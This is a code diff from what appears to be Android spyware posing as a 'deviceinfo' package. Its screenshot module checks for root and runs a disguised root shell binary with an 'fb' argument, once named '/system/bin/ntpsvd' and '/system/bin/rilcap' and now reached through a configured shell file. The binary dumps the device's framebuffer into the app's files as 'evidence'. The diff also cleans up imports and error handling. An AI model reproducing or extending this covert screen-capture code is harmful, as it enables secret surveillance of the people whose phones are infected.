@@ -23,9 +23,11 @@ import android.view.Display;
 import android.view.Surface;
 import android.view.WindowManager;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
@@ -33,9 +35,9 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
+import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.WChar;
 import com.android.m.M;
-
 
 /**
  * The Class SnapshotAgent.
@@ -72,7 +74,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	@Override
 	public boolean parse(ConfModule conf) {
 
-		if ( !Status.self().haveRoot() ) {
+		if (!Status.self().haveRoot()) {
 			return false;
 		}
 
@@ -287,7 +289,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (model.contains("gt-i9100")) {
 			return true;
 		}
-		
+
 		// Samsung Galaxy S3
 		if (model.contains("gt-i9300")) {
 			return true;
@@ -343,17 +345,13 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
-		// 11_2=/system/bin/ntpsvd fb
-		final String getrawpath = M.e("/system/bin/ntpsvd fb"); //$NON-NLS-1$
-
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			// a_0=/system/bin/ntpsvd
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { M.e("/system/bin/rilcap"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
-			localProcess.waitFor();
+			Execute.execute(Configuration.shellFile + " fb /data/data/" + Status.self().getAppContext().getPackageName()
+					+ "/files/frame");
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
@@ -364,21 +362,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 			if (file.exists()) {
 				return file.read();
 			}
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
+		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} catch (final InterruptedException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
+				Check.log(TAG + " (getRawBitmap) Error: " + e);
 			}
 		}
 
